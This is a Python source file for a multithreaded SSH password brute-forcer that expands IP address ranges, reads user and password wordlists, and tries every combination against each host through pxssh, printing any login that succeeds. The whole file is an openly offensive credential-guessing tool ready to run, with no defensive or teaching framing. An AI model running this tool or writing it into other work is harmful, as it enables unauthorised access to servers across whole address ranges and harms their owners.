from pexpect import pxssh
import optparse
import re
import time
from threading import *

connectLock = BoundedSemaphore(20)


def connect(host, user, password, release):
    try:

        s = pxssh.pxssh()
        #  Try login with user/password
        s.login(host, user, password)
        print('[+] ' + host +' Password Found: ' + user + " of password is " + password)
#    except Exception, e:
#       print('Error: ', e)
    finally:
        connectLock.release()


def regularMatch(host):

    #*.*.*.*-*
    patternInput = re.compile(r'(\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3})[ ]?-[ ]?(\d{1,3})\Z')
    patternData = re.compile(r'(\d{1,3}.\d{1,3}.\d{1,3}.)\d{1,3}[ ]?-[ ]?(\d{1,3})\Z')
    patternRange = re.compile(r'\d{1,3}.\d{1,3}.\d{1,3}.(\d{1,3})[ ]?-[ ]?(\d{1,3})\Z')

    # *.*.*.*-*.*.*.*
    patternInput1 = re.compile(r'\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}[ ]?-[ ]?\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}\Z')
    patternData1 = re.compile(r'(\d{1,3}.\d{1,3}.\d{1,3}).\d{1,3}.*?\Z')
    patternRange1 = re.compile(r'\d{1,3}.\d{1,3}.\d{1,3}.(\d{1,3})[ ]?-[ ]?\d{1,3}.\d{1,3}.\d{1,3}.(\d{1,3})\Z')

    # *.*.*.*/*

    #获取ip范围list
    #第一种匹配模式
    ipList = matchFun(patternInput, patternData, patternRange, host)
    if ipList:
        return ipList
    #第二种撇配模式
    else:
        ipList = matchFun(patternInput1, patternData1, patternRange1, host)
        if ipList:
            return ipList
        else:
            return None






def matchFun(patternInput, patternData, patternRange, host):
    #匹配输入格式 数据 数据范围
    resultInput = re.match(patternInput, host)
    if resultInput:
        result = re.match(patternData, host)
        if result:
            dataRange = re.match(patternRange, host)
            if dataRange:
                dataInfo = (result.group(1), int(dataRange.group(1)), int(dataRange.group(2)) + 1)
    else:
        return None
    ipList = []
    for x in range(dataInfo[1], dataInfo[2]):
        ip = dataInfo[0] + str(x)
        ipList.append(ip)

    return ipList

    # else:
    #     result = re.match(pattern2, '192.168.0.1 - 192.168.0.5')
    #     if result:
    #         print result.group(1)
    #         print result.group(2)
    #         for x in range(1, int(result.group(2))):
    #             ip = result.group(1) + str(x)
    #             print ip



def violentAttack(host, users, passwords):
    #读取用户名 密码list
    fusers = open(users, 'r')
    fpasswords = open(passwords, 'r')
    for user in fusers.readlines():
        user = user.strip('\r\n')
        fpasswords.seek(0)
        for password in fpasswords:
            password = password.strip('\r\n')
            connectLock.acquire()
            print("[-] Testing: " + host + ' '+ str(user) + ' of password is '+ str(password))
            t = Thread(target = connect, args = (host, user, password, True))
            t.start()
    return


def main():
    parser = optparse.OptionParser("usage: %prog -H <Target host> -u <users> p <passwords>")
    parser.add_option('-H', '--host', dest='targetHost', type='string', help='specify target host or host list')
    parser.add_option('-u', '--users', dest='users', type='string', help='specify the user or users list')
    parser.add_option('-p', '--passwords', dest='passwds', type='string', help='specify password or passwordslist')
    (options, args) = parser.parse_args()
    host = options.targetHost
    users = options.users
    passwds = options.passwds
    if (host == None) | (users == None) | (passwds == None):
        print(parser.usage)
        exit(0)

    ipList = regularMatch(host)
    if ipList:
        for ip in ipList:
            violentAttack(ip, users, passwds)
    else:
        print(None)


if __name__ == '__main__':
    main()